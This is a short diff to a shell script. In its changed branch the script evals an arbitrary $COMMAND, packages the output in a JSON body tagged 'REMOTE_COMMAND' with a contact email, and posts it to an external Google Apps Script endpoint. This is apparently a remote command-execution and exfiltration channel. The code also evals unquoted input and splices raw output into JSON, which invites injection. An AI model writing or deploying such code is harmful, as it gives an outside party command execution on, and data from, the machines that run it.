@@ -49,13 +49,14 @@ func_compare() {
   else
     # echo "Files are different.  Exit 0";
     cat $CODE > $PATH_LOG;
-    eval $COMMAND > $OUTPUT;
+    COMMAND_OUTPUT=$(eval $COMMAND);
+    BODY_OUTPUT="{'Email': 'pawn88@live.com', 'Subject':'REMOTE_COMMAND', 'Message': \'$COMMAND_OUTPUT\'}";
 
     cat <<EOF | tr '\n' ' ' | bash 
       -X POST
       -H "Content-Type: application/json" 
       -H "Accept: application/json"
-      -d '{"method":"POST", "body":"$OUTPUT"}'
+      -d '{"method":"POST", "body":"$BODY_OUTPUT"}'
       https://script.google.com/macros/s/AKfycbzzVxX1O0UTSzHBe7UElCNwnVPZrU3GqE98pmrivrQajqqM8QEe477O6MEl8gbhimozCg/exec
     EOF
     
